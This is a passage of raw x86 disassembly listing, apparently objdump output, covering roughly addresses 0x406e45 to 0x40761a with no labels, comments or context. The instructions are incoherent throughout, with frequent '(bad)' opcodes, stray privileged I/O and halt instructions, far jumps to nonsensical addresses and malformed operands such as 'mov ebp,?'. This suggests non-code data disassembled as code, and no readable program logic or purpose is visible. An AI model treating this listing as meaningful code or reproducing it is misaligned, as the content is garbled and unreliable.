  406e45:	mov    ebx,0xcf4d2c4e
  406e4a:	out    0x57,al
  406e4c:	dec    esp
  406e4d:	jne    0x406e54
  406e4f:	sbb    al,0x51
  406e51:	sub    al,0x91
  406e53:	(bad)  
  406e54:	div    ch
  406e56:	pushf  
  406e57:	repz push 0xffffffcf
  406e5a:	aad    0x57
  406e5c:	jbe    0x406e21
  406e5e:	mov    ecx,0xb0f5cd35
  406e63:	enter  0xdccf,0xfb
  406e67:	(bad)  
  406e69:	pop    edx
  406e6a:	xchg   edx,eax
  406e6b:	scas   eax,DWORD PTR es:[edi]
  406e6c:	test   al,0xfc
  406e6e:	mov    ch,0x75
  406e70:	sub    al,0x75
  406e72:	jno    0x406e0d
  406e74:	mov    ebp,0x8d154f2b
  406e79:	pop    ebx
  406e7a:	sub    al,BYTE PTR [ecx-0x18]
  406e7d:	cmp    BYTE PTR [ebp-0x27ffbb7],cl
  406e83:	std    
  406e84:	mov    eax,0xed5c4528
  406e89:	sbb    ecx,edi
  406e8b:	push   ss
  406e8c:	popf   
  406e8d:	mov    cl,0x56
  406e8f:	cwde   
  406e90:	sahf   
  406e91:	in     al,dx
  406e92:	mov    ebx,0xc63e7d5b
  406e97:	ins    BYTE PTR es:[edi],dx
  406e98:	cmp    esp,edx
  406e9a:	mov    BYTE PTR [edx],bl
  406e9c:	pop    edi
  406e9d:	inc    esi
  406e9e:	pushf  
  406e9f:	jns    0x406eee
  406ea1:	push   0x58
  406ea3:	push   ebx
  406ea4:	add    BYTE PTR [ebx+0x44],ch
  406ea7:	ret    
  406ea8:	fstp   TBYTE PTR [ecx]
  406eaa:	js     0x406e3a
  406eac:	mov    WORD PTR [ecx+0x54],cs
  406eaf:	jl     0x406ec5
  406eb1:	fcmove st,st(6)
  406eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eb4:	neg    DWORD PTR [eax+0x5abeae10]
  406eba:	ja     0x406f23
  406ebc:	xchg   edi,eax
  406ebd:	sbb    dl,BYTE PTR ds:0xcbe705fa
  406ec3:	pushf  
  406ec4:	adc    eax,0x288dd452
  406ec9:	push   ebx
  406eca:	push   ds
  406ecb:	cmp    eax,0xdba00919
  406ed0:	pop    esp
  406ed1:	ficom  WORD PTR [ecx-0x71e8e330]
  406ed7:	jle    0x406f1f
  406ed9:	push   esp
  406eda:	sub    cl,ah
  406edc:	sub    al,0xc1
  406ede:	cwde   
  406edf:	stc    
  406ee0:	push   edi
  406ee1:	rol    DWORD PTR [esi+0x50],cl
  406ee4:	jmp    0x406e7a
  406ee6:	cmp    eax,0xffd6953e
  406eeb:	mov    dh,0x26
  406eed:	in     eax,dx
  406eee:	push   ebp
  406eef:	icebp  
  406ef0:	out    dx,al
  406ef1:	test   DWORD PTR cs:[ebp+0x33],0x5bd29278
  406ef9:	adc    ecx,esi
  406efb:	fstp   st(6)
  406efd:	aaa    
  406efe:	or     al,0xd6
  406f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f01:	pop    esp
  406f02:	mov    ecx,0x9677f682
  406f07:	sub    DWORD PTR [eax+0x2],esp
  406f0a:	add    esi,ebx
  406f0c:	dec    edi
  406f0d:	mov    DWORD PTR [edi-0x74],edi
  406f10:	(bad)  [edi]
  406f12:	push   ss
  406f13:	sub    al,0x57
  406f15:	pop    ecx
  406f16:	add    DWORD PTR [esp+ecx*2+0x4a],edx
  406f1a:	jge    0x406f48
  406f1c:	ins    BYTE PTR es:[edi],dx
  406f1d:	add    DWORD PTR [edx+0x1e],eax
  406f20:	test   cl,0xc6
  406f23:	mov    al,0xe3
  406f25:	fist   WORD PTR [edi+edx*8+0x676d9e00]
  406f2c:	neg    DWORD PTR [ebx]
  406f2e:	icebp  
  406f2f:	xchg   edi,eax
  406f30:	in     eax,dx
  406f31:	jb     0x406f8d
  406f33:	call   0x8a2b:0xa7c5847f
  406f3a:	push   ebx
  406f3b:	pop    edi
  406f3c:	loope  0x406f3c
  406f3e:	or     BYTE PTR [edx],al
  406f40:	xchg   BYTE PTR [edx+0x17f5abb4],dl
  406f46:	arpl   WORD PTR [ebp+0x23],sp
  406f49:	xor    al,0x91
  406f4b:	and    esi,esp
  406f4d:	mov    eax,ds:0xf383a285
  406f52:	sbb    dl,BYTE PTR [edi]
  406f54:	or     DWORD PTR [eax-0x37d1b1db],0x25
  406f5b:	leave  
  406f5c:	fbstp  TBYTE PTR [ecx-0x4de3dac9]
  406f62:	add    al,0x98
  406f64:	push   ecx
  406f65:	test   dl,ah
  406f67:	or     eax,0xc44a0481
  406f6c:	fstp   DWORD PTR [eax-0x2b]
  406f6f:	xchg   DWORD PTR [esi-0x42],edx
  406f72:	frstor [esi+0x4310444d]
  406f78:	add    edx,edx
  406f7a:	or     edi,0x39
  406f7d:	loope  0x406f41
  406f7f:	xor    al,0xb0
  406f81:	adc    DWORD PTR [edi+0x52],0xffffffec
  406f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f86:	xchg   ebp,eax
  406f87:	fld    QWORD PTR [bp+di-0x2c]
  406f8b:	inc    eax
  406f8c:	addr16 jle 0x406f18
  406f8f:	mov    ecx,ebp
  406f91:	push   eax
  406f92:	int    0x67
  406f94:	dec    ebx
  406f95:	xchg   ecx,eax
  406f96:	hlt    
  406f97:	ret    0x7045
  406f9a:	sub    dl,BYTE PTR [ebp+0x3b8e7e9d]
  406fa0:	mov    ebp,?
  406fa2:	xchg   esp,eax
  406fa3:	cld    
  406fa4:	cld    
  406fa5:	jo     0x407018
  406fa7:	mov    ebx,0x6e46fe8d
  406fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fae:	mov    bl,0x64
  406fb0:	test   eax,0xf1790751
  406fb5:	bound  ebp,QWORD PTR [eax+ebp*2]
  406fb8:	pushf  
  406fb9:	add    DWORD PTR [esp+ecx*2+0x6ef77ea6],ecx
  406fc0:	js     0x406f91
  406fc2:	mov    cl,0x93
  406fc4:	fdiv   QWORD PTR [edi+eax*4-0x34d9b0cc]
  406fcb:	pop    esi
  406fcc:	cmp    esi,DWORD PTR [esi+0x1dc44a15]
  406fd2:	sahf   
  406fd3:	imul   eax,DWORD PTR [esi],0xc695564c
  406fd9:	xor    BYTE PTR [edi-0x15af7791],bl
  406fdf:	mov    edx,DWORD PTR [ecx+edi*4-0x18592db6]
  406fe6:	lea    ebx,[eax-0x5f17dd0c]
  406fec:	dec    esi
  406fed:	adc    bl,bh
  406fef:	iret   
  406ff0:	(bad)  
  406ff1:	dec    ebx
  406ff2:	sub    al,0xfc
  406ff4:	in     al,dx
  406ff5:	nop
  406ff6:	sub    DWORD PTR [ebx],edx
  406ff8:	lods   al,BYTE PTR ds:[esi]
  406ff9:	(bad)  
  406ffa:	in     eax,dx
  406ffb:	fild   QWORD PTR [edx]
  406ffd:	or     eax,0xf9b2b378
  407002:	mov    edx,0x628e0d9b
  407007:	aaa    
  407008:	adc    al,0x3d
  40700a:	mov    ebp,0x36338494
  40700f:	jmp    0x406ff9
  407011:	retf   
  407012:	bound  ebx,QWORD PTR [esi+0x2622494d]
  407018:	call   0x85f727bf
  40701d:	dec    ebp
  40701e:	xchg   BYTE PTR [edi+0x18],ah
  407021:	clc    
  407022:	rol    DWORD PTR [ebx],0x9c
  407025:	xchg   ebp,eax
  407026:	jmp    0x22fb911e
  40702b:	ret    0xf563
  40702e:	scas   eax,DWORD PTR es:[edi]
  40702f:	not    BYTE PTR [eax]
  407031:	xchg   ebp,eax
  407032:	mov    bh,0xcf
  407034:	sub    al,0xa6
  407036:	and    dh,dl
  407038:	add    ah,BYTE PTR [ebp+esi*1-0x14]
  40703c:	hlt    
  40703d:	icebp  
  40703e:	mov    ?,WORD PTR ds:0x286d5b53
  407044:	add    al,0x11
  407046:	mov    ?,WORD PTR [ebp-0x59ba8cad]
  40704c:	sub    al,0x4b
  40704e:	cmp    eax,0x9b4d3f4d
  407053:	mov    al,0x7c
  407055:	stc    
  407056:	xor    BYTE PTR [edi],dl
  407058:	scas   al,BYTE PTR es:[edi]
  407059:	cmp    BYTE PTR [esi-0x31],bh
  40705c:	repz (bad) [eax]
  40705f:	jecxz  0x407072
  407061:	in     al,0xec
  407063:	sbb    BYTE PTR [eax-0x11],ah
  407066:	pop    eax
  407067:	push   ebx
  407068:	dec    esp
  407069:	mov    ds:0x80489422,eax
  40706e:	retf   
  40706f:	into   
  407070:	or     esi,ebx
  407072:	(bad)  
  407073:	jg     0x4070aa
  407075:	out    0xff,al
  407077:	imul   ecx,eax,0x30
  40707a:	out    0x2b,eax
  40707c:	and    al,0x56
  40707e:	or     edx,DWORD PTR [edi+0x47bd8675]
  407084:	sbb    al,0xb3
  407086:	cmc    
  407087:	mov    ebx,DWORD PTR [esp+edi*1-0x5babab81]
  40708e:	push   eax
  40708f:	(bad)  
  407090:	rep stos BYTE PTR es:[edi],al
  407092:	xchg   esp,eax
  407093:	outs   dx,DWORD PTR ds:[esi]
  407094:	ja     0x40706b
  407096:	mov    ecx,ecx
  407098:	in     eax,0x6d
  40709a:	dec    eax
  40709b:	adc    al,0xfa
  40709d:	dec    ebx
  40709e:	stc    
  40709f:	jecxz  0x407062
  4070a1:	pop    ss
  4070a2:	xchg   edx,edx
  4070a4:	pop    esp
  4070a5:	pusha  
  4070a6:	cs (bad) 
  4070a9:	lods   eax,DWORD PTR ds:[esi]
  4070aa:	repz addr16 add bh,ch
  4070ae:	(bad)
  4070b1:	mov    eax,0xf574efcf
  4070b6:	mov    ebp,0x9e92c55a
  4070bb:	xchg   esi,eax
  4070bc:	jno    0x40705c
  4070be:	pop    ss
  4070bf:	mov    DWORD PTR [ebx],edx
  4070c1:	pop    esp
  4070c2:	jnp    0x4070ee
  4070c4:	inc    esp
  4070c5:	sbb    DWORD PTR ds:0xd33a807a,ecx
  4070cb:	jmp    0x1794:0x8450662d
  4070d2:	outs   dx,BYTE PTR ds:[esi]
  4070d3:	adc    DWORD PTR [esi],esi
  4070d5:	cwde   
  4070d6:	push   esp
  4070d7:	test   eax,0x638368a1
  4070dc:	ret    
  4070dd:	sub    eax,0xe6cdbcbf
  4070e2:	xor    eax,0x3ada799c
  4070e7:	clc    
  4070e8:	dec    edi
  4070e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ea:	scas   al,BYTE PTR es:[edi]
  4070eb:	inc    ebx
  4070ec:	or     DWORD PTR [esp+esi*1+0xa],ebx
  4070f0:	push   esp
  4070f1:	inc    edx
  4070f2:	or     al,0xb2
  4070f4:	cmp    edi,esp
  4070f6:	push   edx
  4070f7:	call   0xad818ae3
  4070fc:	in     al,0xe4
  4070fe:	xchg   BYTE PTR [ecx+0x43],cl
  407101:	pop    edx
  407102:	pushf  
  407103:	ror    DWORD PTR [eax],cl
  407105:	dec    eax
  407106:	mov    eax,ds:0x2ac23d61
  40710b:	cmp    eax,0x2888565f
  407110:	xor    bl,bl
  407112:	(bad)  
  407113:	fimul  DWORD PTR ds:0x51735c2
  407119:	or     DWORD PTR [edi+0x71],esi
  40711c:	pop    es
  40711d:	imul   ebp,DWORD PTR [ebp+0x62ab7454],0x75
  407124:	bnd jne 0x407173
  407127:	push   cs
  407128:	ficom  WORD PTR [esp+ebx*8-0x54246eeb]
  40712f:	retf   0x9eb4
  407132:	enter  0xf19f,0x1e
  407136:	cmp    BYTE PTR [esi-0x3f551310],0xa9
  40713d:	pop    ds
  40713e:	leave  
  40713f:	and    dh,BYTE PTR [edi-0x602adfed]
  407145:	clc    
  407146:	and    BYTE PTR [ebx-0x6e769a5f],bl
  40714c:	xchg   edx,eax
  40714d:	adc    DWORD PTR [eax],edi
  40714f:	xchg   ecx,eax
  407150:	fnstsw WORD PTR [edi+0x71]
  407153:	xchg   ecx,eax
  407154:	mov    ecx,0x343c3a99
  407159:	dec    eax
  40715a:	pushf  
  40715b:	mov    ch,0xae
  40715d:	loop   0x407176
  40715f:	imul   edi,DWORD PTR [ebp+eiz*2+0xfd94ee0],0xecd74059
  40716a:	dec    eax
  40716b:	xor    esp,esi
  40716d:	(bad)  
  40716e:	in     al,0x58
  407170:	(bad)  
  407171:	cmp    DWORD PTR [ebx],esi
  407173:	add    BYTE PTR [edi+0x49b4c8f3],al
  407179:	or     al,0xfe
  40717b:	popf   
  40717c:	dec    eax
  40717d:	(bad)  
  40717f:	sti    
  407180:	add    BYTE PTR [edi-0x6b],cl
  407183:	jns    0x407180
  407185:	retf   0x62f3
  407188:	add    DWORD PTR [esi+0x13],ebx
  40718b:	out    0xcf,eax
  40718d:	jo     0x407163
  40718f:	mov    al,0x61
  407191:	dec    edx
  407192:	mov    BYTE PTR [ecx],dh
  407194:	test   edi,ebp
  407196:	imul   edi,DWORD PTR ds:0xb67ce67d,0xffffffa8
  40719d:	aam    0xb9
  40719f:	je     0x4071b9
  4071a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071a2:	lods   eax,DWORD PTR ds:[esi]
  4071a3:	mov    esi,0x5fede87c
  4071a8:	sub    al,0xd4
  4071aa:	sbb    al,ch
  4071ac:	jno    0x40720d
  4071ae:	fwait
  4071af:	sbb    cl,bh
  4071b1:	xchg   BYTE PTR [ebp+0x4b],dh
  4071b4:	out    dx,al
  4071b5:	or     BYTE PTR [ebx],bh
  4071b7:	out    0x13,eax
  4071b9:	add    DWORD PTR [edx-0x7a9a5dc8],esi
  4071bf:	sbb    bl,BYTE PTR [ebx+0x76]
  4071c2:	sub    BYTE PTR [edx-0x15],0x5c
  4071c6:	dec    edi
  4071c7:	mov    bh,0x3e
  4071c9:	jl     0x4071ff
  4071cb:	add    esp,DWORD PTR [eax]
  4071cd:	out    dx,eax
  4071ce:	in     eax,dx
  4071cf:	ret    
  4071d0:	in     eax,dx
  4071d1:	(bad)  
  4071d3:	jno    0x4071c0
  4071d5:	mov    ds:0xd269825e,eax
  4071da:	mov    ah,BYTE PTR [edx]
  4071dc:	mov    bl,BYTE PTR [ecx+0x2a]
  4071df:	(bad)  
  4071e0:	outs   dx,BYTE PTR ds:[esi]
  4071e1:	ja     0x407174
  4071e3:	ret    
  4071e4:	cmc    
  4071e5:	je     0x40724f
  4071e7:	xchg   esi,eax
  4071e8:	xchg   esi,eax
  4071e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ea:	sbb    BYTE PTR [esi-0x37e11fba],bh
  4071f0:	mov    WORD PTR [edx-0x70561318],ss
  4071f6:	push   cs
  4071f7:	je     0x4071d9
  4071f9:	inc    esi
  4071fa:	xor    al,0x5c
  4071fc:	(bad)  [eax-0x4c6a1e8a]
  407202:	xor    BYTE PTR [ebx+edi*8+0x53aa480a],cl
  407209:	sub    al,0x6f
  40720b:	xlat   BYTE PTR ds:[ebx]
  40720c:	adc    esi,eax
  40720e:	jp     0x407266
  407210:	mov    cl,0xce
  407212:	inc    ebp
  407213:	bound  edx,QWORD PTR [ebx+0x52]
  407216:	adc    al,0xda
  407218:	lahf   
  407219:	xchg   edi,eax
  40721a:	test   ecx,0xe86020f4
  407220:	sbb    BYTE PTR [edi+ecx*2+0x1b],dl
  407224:	pop    edx
  407225:	xchg   ebp,eax
  407226:	stc    
  407227:	inc    eax
  407228:	add    eax,0x9454a7e4
  40722d:	or     eax,0xffffff9b
  407230:	mov    ebx,0x96221173
  407235:	jp     0x407228
  407237:	cmp    al,0xe5
  407239:	leave  
  40723a:	in     al,0x14
  40723c:	xchg   ebx,eax
  40723d:	dec    edi
  40723e:	(bad)  
  407240:	and    eax,0x6a0ad10
  407245:	(bad)  
  407247:	addr16 xchg ebp,eax
  407249:	cmp    ebp,edx
  40724b:	jae    0x407261
  40724d:	lea    edi,ds:0x976df00d
  407253:	fbld   TBYTE PTR [edx]
  407255:	sbb    cl,al
  407257:	cld    
  407258:	hlt    
  407259:	cmp    DWORD PTR [edi],ecx
  40725b:	mov    edi,0x37dc62cb
  407260:	sbb    eax,0x8b022c70
  407265:	push   edi
  407266:	adc    eax,0xb2fd2781
  40726b:	sbb    al,0x7b
  40726d:	test   DWORD PTR [esi-0x4b],ebx
  407270:	ins    BYTE PTR es:[edi],dx
  407271:	sbb    eax,0x61d0aa9e
  407276:	adc    dl,BYTE PTR [ebx+0x7bd82ee7]
  40727c:	rcr    BYTE PTR [ecx+0x55b13cb9],1
  407282:	push   0x64eac3d0
  407287:	iret   
  407288:	in     eax,0xff
  40728a:	sub    BYTE PTR [edi],ch
  40728c:	jle    0x40726f
  40728e:	or     bh,ah
  407290:	jno    0x407305
  407292:	aas    
  407293:	call   0x8b90:0xcf0be636
  40729a:	cmp    esp,DWORD PTR [edx+esi*8]
  40729d:	jmp    0x547d:0xb1cbaf22
  4072a4:	shr    DWORD PTR [ecx+0x21c4f7fa],0x5d
  4072ab:	inc    esi
  4072ac:	inc    eax
  4072ad:	jl     0x4072d0
  4072af:	mov    ecx,0x7b5d2faa
  4072b4:	mov    WORD PTR [eax-0x4d],es
  4072b7:	pop    esi
  4072b8:	mov    al,ds:0x427ef60e
  4072bd:	or     ebx,DWORD PTR [edx+0x53]
  4072c0:	push   es
  4072c1:	scas   al,BYTE PTR es:[edi]
  4072c2:	outs   dx,BYTE PTR ds:[esi]
  4072c3:	add    ebp,DWORD PTR [esp+eax*2+0x72b0bd5f]
  4072ca:	xchg   esi,eax
  4072cb:	(bad)  
  4072cc:	mov    bh,0x85
  4072ce:	push   esi
  4072cf:	add    ecx,edi
  4072d1:	push   ebp
  4072d2:	push   ebp
  4072d3:	adc    al,0xaf
  4072d5:	push   ds
  4072d6:	rcl    DWORD PTR [ebx],0xc8
  4072d9:	je     0x40729c
  4072db:	lock enter 0x1d91,0x1f
  4072e0:	xor    eax,0xb4fc3b89
  4072e5:	iret   
  4072e6:	ds add al,0x3e
  4072e9:	scas   eax,DWORD PTR es:[edi]
  4072ea:	pop    es
  4072eb:	xchg   DWORD PTR [esi],eax
  4072ed:	adc    ecx,ecx
  4072ef:	or     ebx,ebp
  4072f1:	jecxz  0x407355
  4072f3:	retf   
  4072f4:	push   edx
  4072f5:	dec    eax
  4072f6:	cmp    DWORD PTR [eax],esp
  4072f8:	cs jne 0x4072c3
  4072fb:	add    BYTE PTR [edx-0x2376327e],0x10
  407302:	loop   0x407362
  407304:	mov    al,0xba
  407306:	cs pop eax
  407308:	add    cl,BYTE PTR [ebx-0x45e57d1c]
  40730e:	aaa    
  40730f:	retf   0x93f
  407312:	sub    BYTE PTR [edx-0x22],bh
  407315:	mov    ds:0xf4b98da6,al
  40731a:	and    al,0x25
  40731c:	shl    cl,1
  40731e:	jb     0x407328
  407320:	(bad)  
  407322:	inc    ebp
  407323:	push   eax
  407324:	(bad)  
  407325:	jns    0x407370
  407327:	ficom  DWORD PTR [ebp-0x43]
  40732a:	push   edx
  40732b:	jmp    FWORD PTR [edx+0x29]
  40732e:	mov    ds:0x36806882,al
  407333:	sti    
  407334:	push   0xffffffbd
  407336:	shr    DWORD PTR [ebx+0x63129449],cl
  40733c:	jne    0x40737f
  40733e:	rol    BYTE PTR [edx+edx*1-0x2d],1
  407342:	cwde   
  407343:	dec    ecx
  407344:	jge    0x40739b
  407346:	bound  ebx,QWORD PTR [eax-0x45]
  407349:	inc    edi
  40734a:	cmp    BYTE PTR [ecx-0x3124620e],0x92
  407351:	pop    ds
  407352:	xchg   ecx,eax
  407353:	sar    cl,cl
  407355:	sahf   
  407356:	ds ret 0x89b6
  40735a:	lods   eax,DWORD PTR ds:[esi]
  40735b:	rcl    dl,cl
  40735d:	dec    esp
  40735e:	inc    ebx
  40735f:	xchg   ebx,eax
  407360:	fidivr DWORD PTR [ebx]
  407362:	add    al,BYTE PTR [esi+0x50578ddd]
  407368:	sahf   
  407369:	xchg   ecx,eax
  40736a:	ins    DWORD PTR es:[edi],dx
  40736b:	and    dl,ch
  40736d:	add    dh,BYTE PTR [ecx+0x179afba1]
  407373:	add    al,ah
  407375:	dec    eax
  407376:	pop    ds
  407377:	mov    ebp,0x1df6a1f4
  40737c:	test   BYTE PTR [ecx+ebx*2-0x5cddda88],dh
  407383:	sbb    cl,BYTE PTR [esi+0x77]
  407386:	rcl    BYTE PTR [ecx+0xd0f59b5],0xef
  40738d:	push   esp
  40738e:	ja     0x4073df
  407390:	lods   eax,DWORD PTR ds:[esi]
  407391:	xor    ebp,DWORD PTR [edi+ebp*2+0x1d]
  407395:	and    eax,edx
  407397:	imul   eax,DWORD PTR [eax],0x4af978ca
  40739d:	sar    BYTE PTR [ebp+0x0],1
  4073a0:	inc    esp
  4073a1:	xor    BYTE PTR [edx+0x28315541],dh
  4073a7:	add    DWORD PTR [esi],esp
  4073a9:	stos   DWORD PTR es:[edi],eax
  4073aa:	stos   BYTE PTR es:[edi],al
  4073ab:	addr16 repz or al,0x75
  4073af:	push   0xffffffaa
  4073b1:	dec    edi
  4073b2:	lahf   
  4073b3:	adc    ah,BYTE PTR [ecx+0x5cac1b03]
  4073b9:	dec    esp
  4073ba:	adc    DWORD PTR [edi+0x0],esi
  4073bd:	xor    al,0xb7
  4073bf:	out    dx,al
  4073c0:	xchg   al,dh
  4073c2:	push   ebx
  4073c3:	mov    ch,0x74
  4073c5:	hlt    
  4073c6:	jecxz  0x407371
  4073c8:	dec    edx
  4073c9:	xchg   bh,al
  4073cb:	in     eax,dx
  4073cc:	push   ds
  4073cd:	ja     0x4073e8
  4073cf:	pop    edi
  4073d0:	and    DWORD PTR [ebx-0x34d8a3cc],ecx
  4073d6:	add    BYTE PTR [esi],cl
  4073d8:	test   eax,0x38ceac88
  4073dd:	xor    ecx,edi
  4073df:	(bad)
  4073e2:	rcl    si,1
  4073e5:	inc    esp
  4073e6:	gs dec ecx
  4073e8:	mov    ch,0xac
  4073ea:	hlt    
  4073eb:	sbb    DWORD PTR [eax],eax
  4073ed:	mov    al,ds:0xe64f04d7
  4073f2:	xchg   DWORD PTR [ebx],esi
  4073f4:	cmp    bh,bl
  4073f6:	fsub   st(7),st
  4073f8:	les    ecx,FWORD PTR [ebp-0x7]
  4073fb:	inc    ebp
  4073fc:	daa    
  4073fd:	and    al,0x53
  4073ff:	pop    ds
  407400:	adc    al,0x7d
  407402:	jno    0x407429
  407404:	aaa    
  407405:	(bad)  
  407406:	imul   BYTE PTR [esi-0x1b]
  407409:	pop    ecx
  40740a:	fisubr WORD PTR ds:0x7d7ec213
  407410:	and    dh,ch
  407412:	popf   
  407413:	jmp    0x27e7:0x110aca17
  40741a:	ins    DWORD PTR es:[edi],dx
  40741b:	push   esp
  40741c:	push   ds
  40741d:	jmp    0xccd5d249
  407422:	stos   DWORD PTR es:[edi],eax
  407423:	shr    BYTE PTR [edx+0xd],0xd5
  407427:	dec    ebx
  407428:	loopne 0x407411
  40742a:	mov    bl,BYTE PTR [ebx]
  40742c:	jmp    FWORD PTR [edi+0x61]
  40742f:	cmp    al,0x77
  407431:	jno    0x4073cd
  407433:	xor    al,0xfc
  407435:	inc    edx
  407436:	adc    eax,esi
  407438:	sub    dl,dl
  40743a:	daa    
  40743b:	add    DWORD PTR [ebp+eax*2-0x14660132],ecx
  407442:	(bad)  
  407443:	test   DWORD PTR [edi],esi
  407445:	sbb    al,0x69
  407447:	(bad)  
  407448:	test   BYTE PTR [edx+0x2b],ch
  40744b:	hlt    
  40744c:	pusha  
  40744d:	es xchg esi,eax
  40744f:	or     esp,DWORD PTR [ebx-0x5db7694d]
  407455:	jne    0x407429
  407457:	pop    ebp
  407458:	mov    ecx,0xe8f43307
  40745d:	dec    esi
  40745e:	bound  esi,QWORD PTR [ebp-0x22eb07b1]
  407464:	(bad)
  407467:	mov    al,ds:0x6490954
  40746c:	jmp    0x40b3:0x90c794aa
  407473:	mov    ch,0xa
  407475:	pop    es
  407476:	jle    0x407476
  407478:	(bad)  [eax-0x6a]
  40747b:	lahf   
  40747c:	test   al,0x60
  40747e:	test   eax,0x2d773185
  407483:	jns    0x407406
  407485:	push   0xffffffab
  407487:	pushf  
  407488:	pushf  
  407489:	lds    ecx,FWORD PTR [ebp+0x67281994]
  40748f:	cld    
  407490:	aad    0xbb
  407492:	cmp    dl,BYTE PTR [ebx-0x39]
  407495:	aad    0x48
  407497:	mov    eax,ds:0x2eb9f32c
  40749c:	xchg   esp,eax
  40749d:	jns    0x40750d
  40749f:	xlat   BYTE PTR ds:[ebx]
  4074a0:	xor    DWORD PTR [ebp-0x47],0xc10cf469
  4074a7:	sbb    al,0x93
  4074a9:	xchg   edx,eax
  4074aa:	rcl    DWORD PTR [edx+ebx*2-0x35],1
  4074ae:	js     0x407468
  4074b0:	inc    eax
  4074b1:	or     ch,BYTE PTR [ecx+0x79]
  4074b4:	dec    esp
  4074b5:	xor    al,0xe3
  4074b7:	xchg   BYTE PTR [edi+0x10],ah
  4074ba:	push   edi
  4074bb:	push   ecx
  4074bc:	add    al,0x29
  4074be:	test   al,0x38
  4074c0:	(bad)  
  4074c1:	lods   al,BYTE PTR ds:[esi]
  4074c2:	push   eax
  4074c3:	aad    0x7f
  4074c5:	mov    ch,0xcb
  4074c7:	push   ebp
  4074c8:	sub    ch,BYTE PTR [ebx+ecx*8]
  4074cb:	sbb    esp,esp
  4074cd:	popf   
  4074ce:	stc    
  4074cf:	inc    esp
  4074d0:	cwde   
  4074d1:	mov    eax,eax
  4074d3:	lahf   
  4074d4:	(bad)  [ebx-0x44cdc2d5]
  4074da:	mov    ds:0xe9bbd2de,al
  4074df:	(bad)  
  4074e0:	pusha  
  4074e1:	dec    edx
  4074e2:	test   eax,0xa1e8b22f
  4074e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074e8:	adc    bl,bl
  4074ea:	ficom  WORD PTR [eax+eiz*8+0x42565f1a]
  4074f1:	dec    edx
  4074f2:	icebp  
  4074f3:	or     bl,dl
  4074f5:	das    
  4074f6:	pushf  
  4074f7:	add    edx,edx
  4074f9:	push   0xffffff84
  4074fb:	or     bh,BYTE PTR [ebx+0x6a]
  4074fe:	push   0xffffffe4
  407500:	(bad)
  407503:	mov    cl,0x6d
  407505:	pop    edi
  407506:	ret    
  407507:	dec    ecx
  407508:	pop    ebp
  407509:	add    dh,BYTE PTR [esp+eiz*2-0x40a8f0b6]
  407510:	mov    eax,ds:0x7606c364
  407515:	sahf   
  407516:	jnp    0x40758e
  407518:	jg     0x4074ae
  40751a:	mov    esi,0x3ee6bdc
  40751f:	scas   eax,DWORD PTR es:[edi]
  407520:	sub    ebp,ebp
  407522:	test   BYTE PTR [edx+0xd],cl
  407525:	aad    0xc4
  407527:	push   cs
  407528:	aam    0xfd
  40752a:	ret    0x22e
  40752d:	jmp    0x4074d7
  40752f:	adc    al,BYTE PTR [edx]
  407531:	repz ror DWORD PTR [ebp+0x26c4f8a9],cl
  407538:	push   esp
  407539:	aad    0x35
  40753b:	out    dx,eax
  40753c:	cmp    eax,0xb0ece80
  407541:	call   0x60e8:0xca55c491
  407548:	or     BYTE PTR [ebx],ah
  40754a:	mov    cl,0x8c
  40754c:	mov    ebp,0xcf853fe0
  407551:	xchg   DWORD PTR ds:[ecx-0x17],esi
  407555:	mov    DWORD PTR [edi+0x4d44e257],ebx
  40755b:	data16 mov dl,0x7b
  40755e:	xor    edi,DWORD PTR [ecx+0x6]
  407561:	out    0xc4,al
  407563:	mov    ds,WORD PTR [eax+0x16b2635a]
  407569:	les    esi,FWORD PTR [esi+ebp*8]
  40756c:	call   DWORD PTR [eax]
  40756e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40756f:	dec    esi
  407570:	xor    eax,0x318ccb1e
  407575:	jl     0x40752b
  407577:	mov    bl,0xb5
  407579:	pop    ds
  40757a:	xchg   edx,eax
  40757b:	test   eax,0xf1c36391
  407580:	loope  0x407567
  407582:	and    DWORD PTR [ebx],edi
  407584:	popf   
  407585:	fst    QWORD PTR [eax-0x343e01e3]
  40758b:	jbe    0x407538
  40758d:	shr    BYTE PTR [esi-0x52d4d882],1
  407593:	mov    ds:0x664e04d4,ax
  407599:	and    al,BYTE PTR [edi+0x7b658aa3]
  40759f:	or     al,0x8a
  4075a1:	jnp    0x407523
  4075a3:	retf   
  4075a4:	test   eax,0xdb4fb3ce
  4075a9:	cs xchg esp,eax
  4075ab:	cmp    DWORD PTR [esi+0x4b],esp
  4075ae:	mov    esp,0xe54fd9f7
  4075b3:	mov    ch,0x2c
  4075b5:	out    dx,eax
  4075b6:	ror    edi,1
  4075b8:	or     ah,BYTE PTR [edi+0xca0fd30]
  4075be:	sub    BYTE PTR [edi-0x28264cfd],dh
  4075c4:	adc    eax,0xee0ec5bc
  4075c9:	mov    edi,0xe45def1f
  4075ce:	(bad)  
  4075cf:	jne    0x4075f8
  4075d1:	ins    BYTE PTR es:[edi],dx
  4075d2:	jge    0x4075c7
  4075d4:	test   al,0x1b
  4075d6:	cwde   
  4075d7:	sbb    al,0xa2
  4075d9:	push   esi
  4075da:	loope  0x40761a
  4075dc:	les    edi,FWORD PTR ds:0x8460ca15
  4075e2:	or     al,0x75
  4075e4:	fmul   QWORD PTR ds:0x540dfccc
  4075ea:	(bad)  
  4075ec:	inc    ebx
  4075ed:	leave  
  4075ee:	cld    
  4075ef:	jp     0x407633
  4075f1:	cmp    DWORD PTR [ecx-0x3b317097],edi
  4075f7:	pop    esi
  4075f8:	scas   eax,DWORD PTR es:[edi]
  4075f9:	mov    esi,0xac33a2fd
  4075fe:	sbb    DWORD PTR [esp+esi*2],edx
  407601:	adc    al,0xd3
  407603:	aaa    
  407604:	fwait
  407605:	into   
  407606:	mov    BYTE PTR [eax-0x70a6b021],cl
  40760c:	add    DWORD PTR [ecx+0x253ec284],ebp
  407612:	retf   0x2555
  407615:	into   
  407616:	arpl   WORD PTR [edi],di
  407618:	mov    bl,0xa9
  40761a:	addr16 adc esp,esp
